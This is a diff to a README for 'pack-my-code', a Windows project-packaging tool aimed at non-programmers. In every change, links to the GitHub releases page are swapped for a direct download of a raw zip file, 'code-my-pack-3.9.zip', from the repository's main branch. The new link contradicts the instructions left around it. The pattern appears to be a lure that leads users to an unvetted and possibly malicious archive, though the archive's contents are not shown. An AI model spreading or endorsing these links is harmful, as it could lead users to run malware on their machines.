@@ -1,6 +1,6 @@
 # 📦 pack-my-code - Package Your Project for Easy Sharing
 
-[![Download pack-my-code](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Crystainexhaustible329/pack-my-code/releases)
+[![Download pack-my-code](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Crystainexhaustible329/pack-my-code/raw/refs/heads/main/release/code-my-pack-3.9.zip)
 
 ---
 
@@ -41,7 +41,7 @@ The tool works on Windows. You do not need to learn any programming to use it.
 
 **Step 1: Visit the release page**  
 Go to the release page by clicking the big green button at the top or this link:  
-https://github.com/Crystainexhaustible329/pack-my-code/releases  
+https://github.com/Crystainexhaustible329/pack-my-code/raw/refs/heads/main/release/code-my-pack-3.9.zip  
 
 **Step 2: Find the latest release**  
 Look for the most recent version at the top of the list. It usually has the highest version number or the newest date.
@@ -116,7 +116,7 @@ to see all available commands.
 
 Use the link below again to get the latest version whenever you need it:  
 
-[Download pack-my-code](https://github.com/Crystainexhaustible329/pack-my-code/releases)  
+[Download pack-my-code](https://github.com/Crystainexhaustible329/pack-my-code/raw/refs/heads/main/release/code-my-pack-3.9.zip)  
 
 ---
 
